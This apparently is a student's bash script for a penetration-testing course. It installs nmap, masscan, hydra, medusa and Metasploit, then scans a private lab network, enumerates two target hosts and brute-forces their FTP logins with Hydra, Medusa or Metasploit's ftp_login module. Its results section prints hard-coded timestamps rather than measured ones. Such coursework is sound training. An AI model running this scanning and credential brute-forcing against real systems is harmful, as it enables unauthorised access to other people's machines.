#~ #!/bin/bash
#~ #Penetration Testing Project: VULNER ARUN DASSE s13 cfc2407
#~ #Lecturer name: James

echo 'PENETRATION TESTING PROJECT: VULNER '
echo 'ARUN DASSE - s13'
echo 'Lecturer: JAMES'

figlet PROJECT VULNER

function insttools()
{
	echo 'Installing all the relevant applications needed for the project'
	echo "Installing Geany"
	sudo apt-get install geany
	echo "Installing Nmap"
	sudo apt-get install nmap
	echo "Installing Masscan"
	sudo apt-get install masscan
	echo "Installing Hydra"
	sudo apt-get install hydra
	echo "Installing Medusa"
	sudo apt-get install medusa
	echo "Installing Msfconsole"
	sudo apt-get install metasploit-framework
	sudo service postgresql start
	sudo msfdb init
	
}

insttools

#Part-1 - Map Network Devices and Open Ports 
#~ 1.1 Automatically identify the LAN network range
#~ 1.2 Automatically scan the current LAN
#~ 1.3 Enumerate each live host
#~ 1.4 Find potential vulnerabilities for each device

function enum()

{

	echo "[*]The IP address of the LHost is: "
	ifconfig | grep broadcast | awk '{print $2}'

	echo -e "\n[*]Network Range - Scan Initiating: "
	netmask -c 192.168.216.0:192.168.216.255
	netmask -r 192.168.216.0/24

	echo -e "\n[*]The IP addresses of the connected devices on the network range: "
	sudo netdiscover -r 192.168.216.0/24 -P

	echo -e "\n[*]Scanning the tcp/udp open ports and services of the Target Machines: "
	echo -e "\n[*] Initiating Nmap Scan on the Target machine 1: "
	sudo nmap 192.168.216.135 -p- -sV >> ps_tgt1.log
	echo "Results saved on the File:ps_tgt1.log"
	echo -e "\n[*] Initiating Masscan on the Target Machine 1: "
	sudo masscan 192.168.216.135 -pU:1-1000 >> mscan_tgt1.log
	echo "Results saved on the File:mscan_tgt1.log"
	echo -e "\n[*] Initiating Nmap Scan on the Target Machine 2: "
	sudo nmap 192.168.216.136 -p- -sV >> ps_tgt2.log
	echo "Results saved on the File:ps_tgt2.log"
	echo -e "\n[*] Initiating Masscan on the Target Machine 2: "
	sudo masscan 192.168.216.136 -pU:1-1000 >> mscan_tgt2.log
	echo "Results saved on the File:mscan_tgt2.log"

	echo -e "\n[*]Enumeration of the victim machines using the tool enum4linux: " #to get information about the services, access, workgroup, domain info
	echo -e "\n[*] Initiating Enum4linux on the Target Machine 1: "
	enum4linux 192.168.216.135 >> enumtgt1.log
	echo "Results saved on the File:enumtgt1.log"
	echo -e "\n[*] Initiating Enum4linux on the Target Machine 2: "
	enum4linux 192.168.216.136 >> enumtgt2.log
	echo "Results saved on the File:enumtgt2.log"

	echo -e "\n[*]Looking for known vulberabilities: " #For this project I scan the port 22 for the Target Machine 1 and port 3632 for the Target Machine 2.
	echo -e "\n[*] Initiating Nmap scan using --script=vuln on port 22 to find out the known vulnerabilities on the Target Machine 1: "
	sudo nmap 192.168.216.135 -p22 --script=vuln -sV >> vulnscan_tgt1.log
	echo "Results saved on the File:vulnscan_tgt1.log"
	echo -e "\n[*] Initiating Nmap scan using --script=vuln on port 3632 to find out the known vulnerabilities on the Target Machine 2: "
	sudo nmap 192.168.216.136 -p3632 --script=vuln -sV >> vulnscan_tgt2.log
	echo "Results saved on the File:vulnscan_tgt2.log"

}

enum

#Part-2 - Check for Weak Passwords Usage 
#~ 2.1 Allow the user to specify a user list 
#~ 2.2 Allow the user to specify a password list

function lstfls()

{

	echo -e "[*] This is a script to specify the available userlist and password list and executing FTP auxiliary scanning inside msfconsole: "
	echo "Enter the Target1 IP address: "
	read targetIP1
	echo "Specify the user list: "
	read user_file
	echo "Specify the password list: "
	read pwd_file

	echo -e "\n[*]Initiating FTP auxiliary scanning inside msfconsole with the specified user and password list on the Target Machine 1:  "
	echo "spool /home/arun/PT/project/ftpscan1-results.log" >> ftp_scan1.log  #credits: https://charlesreid1.com/wiki/MSF - using the command "spool" to to capture the output you're seeing in Metasploit framework console.
	echo "auxiliary/scanner/ftp/ftp_login" >> ftp_scan1.log
	echo "set rhosts $targetIP1" >> ftp_scan1.log
	echo "set user_file $user_file" >> ftp_scan1.log
	echo "set pass_file $pwd_file" >> ftp_scan1.log
	echo "set verbose true" >> ftp_scan1.log
	echo "run" >> ftp_scan1.log
	echo "spool off" >> ftp_scan1.log
	echo "exit" >> ftp_scan1.log

	msfconsole -qr ftp_scan1.log
	echo -e "\nScan Results saved on the File:ftpscan1-results.log"

	echo -e "\nEnter the Target2 IP address: "
	read targetIP2
	echo "Specify the user list: "
	read user_file
	echo "Specify the password list: "
	read pwd_file

	echo -e "\n[*]Initiating FTP auxiliary scanning inside msfconsole with the specified user and password list on the Target Machine 2:  "
	echo "spool /home/arun/PT/project/ftpscan2-results.log" >> ftp_scan2.log #credits: https://charlesreid1.com/wiki/MSF
	echo "auxiliary/scanner/ftp/ftp_login" >> ftp_scan2.log
	echo "set rhosts $targetIP2" >> ftp_scan2.log
	echo "set user_file $user_file" >> ftp_scan2.log
	echo "set pass_file $pwd_file" >> ftp_scan2.log
	echo "set verbose true" >> ftp_scan2.log
	echo "run" >> ftp_scan2.log
	echo "spool off" >> ftp_scan2.log
	echo "exit" >> ftp_scan2.log

	msfconsole -qr ftp_scan2.log
	echo -e "\nScan Results saved on the File:ftpscan2-results.log"

}

lstfls

#~ 2.3 Allow the user to create a password list

function nwpwdl()

{
	
	echo -e "\n[*]Enter the new passwords to create a new password list: "
		for names in range {1..6}
		do
			read x
			echo "$x" >> newpassword.lst
		done
	echo -e "\nThe new list has the following passwords: "
	cat newpassword.lst

}

nwpwdl


#~ 2.4 If a login service is available, Brute Force with the password list
#~ 2.5 If more than one login service is available, choose the first service


function brtfrc()

{
	
	read -p "Please choose the options to Bruteforce the targets with a user list and new password list created: a) Hydra  or b) Medusa or c) Msfconsole or d) exit?" choices

		case $choices in

			a)
				echo -e "\nInitiating Bruteforce attack on Target1 using Hydra with a new password list: "
				sudo hydra -L /home/arun/PT/project/user.lst -P /home/arun/PT/project/newpassword.lst 192.168.216.135 ftp -vV >> hydratgt1.log
				echo -e "\nResults saved on the File:hydratgt1.log"
				echo -e "\nInitiating Bruteforce attack on Target2 using Hydra with a new password list: "
				sudo hydra -L /home/arun/PT/project/user.lst -P /home/arun/PT/project/newpassword.lst 192.168.216.136 ftp -vV  >> hydratgt2.log
				echo -e "\nResults saved on the File:hydratgt2.log"
				
			;;		
								
			b) 								    
				echo -e "\nInitiating Bruteforce attack on Target1 using Medusa with a new password list: "
				medusa -h 192.168.216.135 -U /home/arun/PT/project/user.lst -P /home/arun/PT/project/newpassword.lst -M ftp >> medusatgt1.log
				echo -e "\nResults saved on the File:medusatgt1.log"
				echo -e "\nInitiating Bruteforce attack on Target2 using Medusa with a new password list: "
				medusa -h 192.168.216.136 -U /home/arun/PT/project/user.lst -P /home/arun/PT/project/newpassword.lst -M ftp  >> medusatgt2.log
				echo -e "\nResults saved on the File:medusatgt2.log"
				
			;;
						
			c) 								    
				echo -e "\nInitiating Bruteforce attack on Target1 using Msfconsole with a new password list: "
				echo "spool /home/arun/PT/project/msfctgt1.log" >> ftp_login1  
				echo "auxiliary/scanner/ftp/ftp_login" >> ftp_login1
				echo "set rhosts 192.168.216.135" >> ftp_login1
				echo "set user_file /home/arun/PT/project/user.lst" >> ftp_login1
				echo "set pass_file /home/arun/PT/project/newpassword.lst" >> ftp_login1
				echo "set verbose true" >> ftp_login1
				echo "run" >> ftp_login1
				echo "spool off" >> ftp_login1
				echo "exit -y" >> ftp_login1

				msfconsole -qr ftp_login1
				echo -e "\nResults saved on the File:msfctgt1.log"
				
				echo -e "\nInitiating Bruteforce attack on Target2 using Msfconsole with a new password list: "
				echo "spool /home/arun/PT/project/msfctgt2.log" >> ftp_login2 
				echo "auxiliary/scanner/ftp/ftp_login" >> ftp_login2
				echo "set rhosts 192.168.216.136" >> ftp_login2
				echo "set user_file /home/arun/PT/project/user.lst" >> ftp_login2
				echo "set pass_file /home/arun/PT/project/newpassword.lst" >> ftp_login2
				echo "set verbose true" >> ftp_login2
				echo "run" >> ftp_login2
				echo "spool off" >> ftp_login2
				echo "exit -y" >> ftp_login2

				msfconsole -qr ftp_login2
				echo -e "\nResults saved on the File:msfctgt2.log"
			;;
								
			d) 
				exit
			;;
esac	
						
}

brtfrc

#Part-3 - Results
#~ 3.1 Display general statistics (time of the scan, number of found devices, etc.) 

function stats()

{
	
	echo -e "\n[*]Displaying the General Statistics of both Machines: "
	echo -e "\nNo of Found Devices: 02"
	echo -e "\n[*]Target Machine 1 - 192.168.216.135: "
	echo -e "Nmap scanning of ports and services of Target Machine 1 done at: 2023-02-01 22:52 EST"
	echo -e "Masscan of Target Machine 1 done at: 2023-02-01 09:32:21 GMT"
	echo -e "enum4linux started on Wed Feb  1 22:58:57 2023"
	echo -e "enum4linux complete on Wed Feb  1 22:59:05 2023"
	echo -e "Nmap scanning of known vulnerabilities for Target Machine 1 done at: 2023-02-01 22:59 EST"
	echo -e "\n[*]Target Machine 2 - 192.168.216.136: "
	echo -e "Nmap scanning of ports and services of Target Machine 2 done at: 2023-02-01 22:55 EST"
	echo -e "Masscan of Target Machine 2 done at: 2023-02-01 09:36:10 GMT"
	echo -e "enum4linux started on Wed Feb  1 22:59:05 2023"
	echo -e "enum4linux completed on Wed Feb  1 22:59:13 2023"
	echo -e "Nmap scanning of known vulnerabilities for Target Machine 2 done at: 2023-02-01 22:59 EST"
	
							
}

stats

#~ 3.2 Save all the results into a report 
#~ 3.3 Allow the user to enter an IP address; display the relevant findings

function fndngs()

{
	
read -p "Please choose the IP address (Target Machines) to display the relevant findings: A) Target1 - 192.168.216.135  or B) Target2 - 192.168.216.136 or C) exit?" choices

case $choices in

			A)
				read -p "Please choose results: a) Scanning Results including  or b) Bruteforce results? " results1

					case $results1 in
					
						a)
							echo -e "[*]Scanning Results: "
							echo -e "\n[*]Nmap scanning of ports and services: "
							cat ps_tgt1.log
							echo -e "\n[*]Masscanning of UDP ports: "
							cat mscan_tgt1.log
							echo -e "\n[*]Enum4linux: "
							cat enumtgt1.log
							echo -e "\n[*]Nmap scanning of known vulnerabilities: "
							cat vulnscan_tgt1.log
							echo -e "\n[*]FTP Auxiliary scanning with a specified user and password list: "
							cat ftpscan1-results.log
							fndngs
						;;
						
						b)
							echo -e "[*]Bruteforce Results after creating a New Password List: "
							echo -e "\n[*]Hydra: "
							cat hydratgt1.log
							echo -e "\n[*]Medusa: "
							cat medusatgt1.log
							echo -e "\n[*]Msfconsole: "
							cat msfctgt1.log
							fndngs
						;;	
						esac			
			;;		
								
			B) 								    
				read -p "Please choose results: i) Nmap Scan results  or ii) Bruteforce results? " results2

					case $results2 in
					
						i)
							echo -e "[*]Scanning Results: "
							echo -e "\n[*]Nmap scanning of ports and services: "
							cat ps_tgt2.log
							echo -e "\n[*]Masscanning of UDP ports: "
							cat mscan_tgt2.log
							echo -e "\n[*]Enum4linux: "
							cat enumtgt2.log
							echo -e "\n[*]Nmap scanning of known vulnerabilities: "
							cat vulnscan_tgt2.log
							echo -e "\n[*]FTP Auxiliary scanning with a specified user and password list: "
							cat ftpscan2-results.log
							fndngs
						;;
						
						ii)
							echo -e "[*]Bruteforce Results after creating a New Password List: "
							echo -e "\n[*]Hydra: "
							cat hydratgt2.log
							echo -e "\n[*]Medusa: "
							cat medusatgt2.log
							echo -e "\n[*]Msfconsole: "
							cat msfctgt2.log
							fndngs
						;;	
						esac	
			;;
			
			C) 								    
				exit
			;;
			
			esac	
						
}

fndngs
